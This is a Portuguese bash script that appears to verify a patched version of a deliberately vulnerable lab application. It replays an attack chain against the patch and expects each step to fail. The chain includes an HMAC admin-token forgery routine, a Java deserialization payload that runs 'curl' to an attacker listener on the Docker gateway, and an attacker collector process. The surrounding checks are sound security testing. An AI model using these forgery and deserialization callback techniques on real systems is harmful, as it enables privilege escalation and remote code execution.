#!/usr/bin/env bash
# Segunda metade da prova de rede: a mesma cadeia contra a versão corrigida.
# Chamado pelo provar.sh, que já exportou os segredos do laboratório e compilou
# o projeto. Uso: bash infra/rede/provar-corrigido.sh <diretório de trabalho>
set -euo pipefail
cd "$(dirname "$0")/../.."

TRABALHO=$1
CORRIGIDO=(docker compose -p brecha-corrigido -f docker-compose.yml -f docker-compose.corrigido.yml)
falhas=0
conferir() { if [ "$1" = 0 ]; then echo "ok     $2"; else echo "FALHOU $2"; falhas=$((falhas + 1)); fi; }
verificar() { local d=$1; shift; if "$@"; then conferir 0 "$d"; else conferir 1 "$d"; fi; }

# Segredos em arquivo, novos, diferentes dos do laboratório. Legíveis pelo
# usuário sem root de cada contêiner, e só por quem tem acesso a esta pasta.
SEGREDOS_DIR="$TRABALHO/segredos"
mkdir -p "$SEGREDOS_DIR"
for nome in brecha_segredo django_secret_key relatorios_token pgpassword painel_token; do
  openssl rand -hex 32 > "$SEGREDOS_DIR/$nome"
done
openssl rand -hex 32 > "$SEGREDOS_DIR/comprovantes_cifra"
openssl rand -hex 32 > "$SEGREDOS_DIR/comprovantes_assinatura"
chmod 644 "$SEGREDOS_DIR"/*
export SEGREDOS_DIR

echo "Versão corrigida"
"${CORRIGIDO[@]}" up -d --build --wait --wait-timeout 300

WAF=http://127.0.0.1:8080
nao_publicado() { [ -z "$(docker port "$("${CORRIGIDO[@]}" ps -q "$1")" 2>/dev/null)" ]; }
verificar "a API não tem porta publicada; só o WAF chega nela" nao_publicado api 8080

entrar() {
  curl -sS -X POST "$WAF/$1/sessoes" -H 'Content-Type: application/json' \
    -d '{"email":"ana@exemplo.com.br","senha":"ana-senha-2026"}' | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])'
}
ana_v1=$(entrar v1)
ana_v2=$(entrar v2)
verificar "pelo WAF, o login normal funciona (controle)" [ -n "$ana_v2" ]

forjar() {
  SEGREDO="$1" python3 - <<'PY'
import base64, hashlib, hmac, os, time
conteudo = base64.urlsafe_b64encode(f"3:ADMIN:{int(time.time()) + 600}".encode()).rstrip(b"=")
assinatura = base64.urlsafe_b64encode(hmac.new(os.environ["SEGREDO"].encode(), conteudo, hashlib.sha256).digest()).rstrip(b"=")
print((conteudo + b"." + assinatura).decode())
PY
}
status_admin() { curl -s -o /dev/null -w '%{http_code}' "$WAF/v2/admin/clientes" -H "Authorization: Bearer $1"; }
verificar "token forjado com o segredo padrão do repositório é recusado" \
  [ "$(status_admin "$(forjar laboratorio-local-segredo-com-mais-de-32-bytes)")" = 401 ]
verificar "token forjado com o segredo do laboratório é recusado" [ "$(status_admin "$(forjar "$BRECHA_SEGREDO")")" = 401 ]

sem_segredo_no_ambiente() {
  for servico in api relatorios comprovantes notificacao banco painel; do
    if docker inspect "$("${CORRIGIDO[@]}" ps -q "$servico")" --format '{{range .Config.Env}}{{println .}}{{end}}' \
      | grep -Eq '^(BRECHA_SEGREDO|PGPASSWORD|POSTGRES_PASSWORD|DJANGO_SECRET_KEY|RELATORIOS_TOKEN_DE_SERVICO|COMPROVANTES_CHAVE_[A-Z]+)='; then
      echo "       segredo em variável de ambiente: $servico"
      return 1
    fi
  done
}
verificar "nenhum contêiner tem segredo em variável de ambiente" sem_segredo_no_ambiente

importar() {
  curl -sS -X POST "$WAF/v1/comprovantes/importar" -H "Authorization: Bearer $ana_v1" \
    -H 'Content-Type: application/json' -d "{\"url\":\"$1\"}" -w '\n%{http_code}'
}
# De dentro da rede interna, pelo contêiner do banco (só na interna, com o
# wget do busybox): prova a rede e o painel sem depender do WAF, que poderia
# barrar o pedido antes e fazer a checagem passar pelo motivo errado.
de_dentro() { "${CORRIGIDO[@]}" exec -T banco wget -q -T 5 -O - "$@"; }
painel_pede_token() {
  local saida
  saida=$(de_dentro http://painel:8080/config 2>&1 || true)
  echo "$saida" | grep -q "401" && ! echo "$saida" | grep -q "$(cat "$SEGREDOS_DIR/pgpassword")"
}
verificar "de dentro da rede, o painel responde 401 e não entrega segredo" painel_pede_token

gateway=$(docker network inspect bridge -f '{{(index .IPAM.Config 0).Gateway}}')
python3 infra/rede/atacante.py 9100 /dev/null "$TRABALHO/coleta-corrigido.txt" & ATACANTE=$!
sleep 1
sem_saida() { ! de_dentro "http://$gateway:9100/chisel" >/dev/null 2>&1; }
verificar "a rede interna não tem saída para a máquina do atacante" sem_saida
kill "$ATACANTE" 2>/dev/null || true

payload=$(java -cp target/classes infra/rede/GerarPayload.java bash -c "curl http://$gateway:9100/coleta")
status=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$WAF/v1/agendamentos" -H "Authorization: Bearer $ana_v1" \
  -H 'Content-Type: application/json' -d "{\"agendamento\":\"$payload\"}")
verificar "o WAF barra o objeto Java serializado (status $status)" [ "$status" = 403 ]

# Mesmo diagnóstico do laboratório: se o WAF não barrou, mostra se o plugin
# foi ativado e o que o ModSecurity registrou.
if [ "$status" != 403 ]; then
  echo "--- diagnóstico do WAF corrigido ---"
  "${CORRIGIDO[@]}" exec -T waf sh -c 'grep -n plugins /etc/modsecurity.d/setup.conf; echo "[plugins]"; ls -l /opt/owasp-crs/plugins/ 2>&1; echo "[montado]"; head -1 /opt/owasp-crs/plugins/bloqueia-serializacao-java-before.conf 2>&1' || true
  "${CORRIGIDO[@]}" logs --no-color --tail=40 waf 2>&1 | grep -iE "9519100|serial|rO0AB|ModSecurity: (Warning|Access)" | head -20 || true
fi

"${CORRIGIDO[@]}" down -v --remove-orphans >/dev/null 2>&1 || true
[ "$falhas" = 0 ]
